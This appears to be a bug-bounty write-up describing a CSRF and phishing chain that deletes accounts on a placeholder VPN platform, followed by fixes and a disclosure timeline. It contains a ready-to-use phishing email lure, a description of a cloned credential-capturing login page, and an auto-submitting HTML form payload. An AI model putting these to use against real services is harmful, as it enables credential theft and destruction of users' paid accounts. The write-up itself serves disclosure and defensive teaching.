#🔒 CSRF + Phishing Chain: Account Deletion Exploit on a VPN Platform

###Summary

This report presents a chained vulnerability where a weak implementation of the account deletion mechanism on a VPN platform (xyz.com) allowed for account deletion via a crafted CSRF payload—provided the victim's password was known. 
The catch? The attacker didn’t know the password in advance—but instead used phishing to collect it and chain it into the CSRF payload.
Even though phishing was used as a support vector (not the vulnerability itself), this chain exposes a critical business logic flaw with real consequences.


###Vulnerability Details

**Type:** CSRF (Cross-Site Request Forgery)
**Impact:** Permanent account deletion (paid subscription loss)
**Authentication Required:** No (relies on victim's active session)
**Prerequisite:** Victim logs in and opens attacker-delivered file

The core issue was that the /delete-account endpoint accepted POST requests containing only the user’s password—with no CSRF token, confirmation prompt, or re-authentication screen.


###Attack Flow

**1. CSRF Attempt -->** Initial testing revealed all sensitive actions were protected—except account deletion, which relied solely on a password field submitted via POST.
  Sample request:
          POST /delete-account HTTP/1.1
          Host: xyz.com
          Content-Type: application/x-www-form-urlencoded
          Cookie: session_id=...
          password=USER_PASSWORD

**2. Phishing Setup -->** To obtain the user’s password, I crafted a phishing email:
    Subject: 🎁 Reward: 3 Free Months of VPN Premium

    Hello [User],
    Thank you for being a loyal XYZ customer. You've been selected for an exclusive reward:
    ✅ 3 Months Free VPN Premium  
    🛡️ Bonus Tracker Blocker  
    ⚡ Priority Support Access  
    
     Click the link below to claim:
     [Login to Your Account]

**3. Fake Login Page -->** A cloned version of the login page captured credentials and immediately offered a downloadable file (coupon.html).

**4. CSRF Payload in coupon.html -->** The downloaded HTML file executed silently using the victim’s active session:
     <form action="https://xyz.com/delete-account" method="POST">
        <input type="hidden" name="password" value="stolen_password_here">
     </form>
     <script>document.forms[0].submit();</script>

**5. Redirection to Real Site -->** After submitting credentials, the victim was redirected to the real login page with a generic error message. Most users would simply log in again.


###Impact
 
Users lost access to their paid accounts permanently
No confirmation email or 2FA step
No CSRF token protection
No user warning or undo mechanism once deleted

###⚠️ Why This Matters

Although phishing was required to demonstrate the exploit, the real issue is poor backend validation and lack of CSRF protection. If a system allows destructive operations with just a password field (which users may reuse or can be harvested), it's vulnerable to abuse.
Modern security must account for human behavior, not just technical inputs.

###💡 Recommendations

Implement CSRF tokens for all sensitive actions
Require user re-authentication via session renewal or OTP
Implement confirmation pages or time-delayed destructive operations
Flag destructive actions via email alerts

###Disclosure Timeline

**📅 Report submitted:** Bugcrowd
**🚫 Status:** Marked Out of Scope (due to phishing chain)
🔒 No exploitation occurred outside of test accounts


###Final Thoughts

Sometimes the bug isn’t the only thing that’s broken.
Even when the report was rejected, the lesson was invaluable. Real attackers do chain phishing and logic flaws together. Ignoring such combinations leaves users vulnerable even when individual vectors look unimportant in isolation.


**If you found this write-up helpful, feel free to ⭐ the repo or share your feedback.
Let's build more secure systems by thinking like attackers ethically.**
